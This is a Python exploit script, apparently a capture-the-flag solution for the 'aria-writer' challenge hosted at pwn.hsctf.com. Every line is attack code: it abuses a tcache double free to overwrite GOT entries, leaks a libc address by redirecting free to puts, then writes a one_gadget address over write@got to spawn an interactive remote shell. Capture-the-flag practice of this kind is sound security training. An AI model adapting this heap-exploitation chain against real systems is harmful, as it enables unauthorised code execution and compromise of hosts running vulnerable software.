from ptrlib import *

def alloc(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("> ")
    sock.sendline(str(size))
    sock.recvuntil("> ")
    sock.sendline(data)

def free():
    sock.recvuntil("> ")
    sock.sendline("2")

def secret():
    sock.recvuntil("> ")
    sock.sendline("3")

elf = ELF("./aria-writer")
libc = ELF("./libc-2.27.so")
#sock = Process("./aria-writer")
sock = Socket("pwn.hsctf.com", 2222)

plt_puts = 0x400750

# name
sock.recvuntil("> ")
sock.sendline("/bin/sh")

# double free for shell
alloc(0x38, "A")
free()
free()
alloc(0x38, p64(elf.got("write")))
alloc(0x38, "")

# double free for libc leak
alloc(0x28, "B")
free()
free()
alloc(0x28, p64(elf.symbol("global")))
alloc(0x28, "")

alloc(0x18, "C")
free()
free()
alloc(0x18, p64(elf.got("free")))
alloc(0x18, "")

# free@got = puts@plt
alloc(0x18, p64(plt_puts))

# global = puts@got
alloc(0x28, p64(elf.got("puts")))

# libc leak
free()
sock.recvline()
addr_puts = u64(sock.recvline().rstrip())
libc_base = addr_puts - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))

# write@got = one gadget
one_gadget = libc_base + 0x4f322
alloc(0x38, p64(one_gadget))

# get the shell!
secret()

sock.interactive()
